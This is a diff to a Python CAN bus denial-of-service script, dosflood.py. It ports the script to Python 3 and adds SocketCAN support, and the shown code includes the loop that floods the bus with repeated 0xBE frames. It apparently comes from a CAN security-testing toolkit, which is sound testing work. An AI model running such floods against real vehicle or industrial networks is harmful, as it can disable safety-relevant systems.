@@ -10,6 +10,9 @@ import time
 #Example: 
 # sudo python dosflood.py /dev/ttyACM0 50 0.01
 # sudo python dosflood.py /dev/ttyACM0 dosflood.json
+# or
+# sudo python3.4 dosflood.py vcan0 50 0.01
+# sudo python3.4 dosflood.py vcan0 dosflood.json
 # payloads: 50(sending can frame counts); 0.01(time delay 0.01s between frames),dosflood.json(sending can frame file)
 #Author: BensonYang
 #Date: 26072016
@@ -32,7 +35,7 @@ def start(self,dev,filename = None,doscount = 1000, delay=0.1):  #no need this f
 		fr.configure(0xBE,8,data)
 		for i in range(0,doscount):
 			dev.send_driver(fr)
-			print fr
+			print (fr)
 			time.sleep(delay)
 			vtmsg = VTMessage(0xBE,8,data,1,delay,"S")				
 			frbuffer.append(vtmsg)
@@ -41,16 +44,22 @@ def start(self,dev,filename = None,doscount = 1000, delay=0.1):  #no need this f
 
 if __name__ == "__main__":
 	
-	print "Usage: sudo python dosflood.py candev [filename] [canframe count] [time delay]"	
+	print ("Usage: sudo python dosflood.py candev [filename] [canframe count] [time delay]")
+	print ("or")	
+	print ("Usage: sudo python3.4 dosflood.py candev [filename] [canframe count] [time delay]")
 
 	if (len(sys.argv) < 2):
-		print 'You must specify one can device'
+		print ('You must specify one can device')
 		exit(1)
 	else:
 		name_devices = sys.argv[1]
 
-	dev = CANDriver(TypeCan.SERIAL,port=sys.argv[1],bit_rate=125000)
-	dev.operate(Operate.START)
+	if(sys.version_info >= (3,3)):
+		dev = CANDriver(TypeCan.SOCKET,name_dev=sys.argv[1])
+		dev.operate(Operate.START)
+	else:
+		dev = CANDriver(TypeCan.SERIAL,port=sys.argv[1],bit_rate=125000)
+		dev.operate(Operate.START)
 
 	if(sys.argv[2][-4:] == "json"):	# send frames from log file  
 		start(None,dev,sys.argv[2])
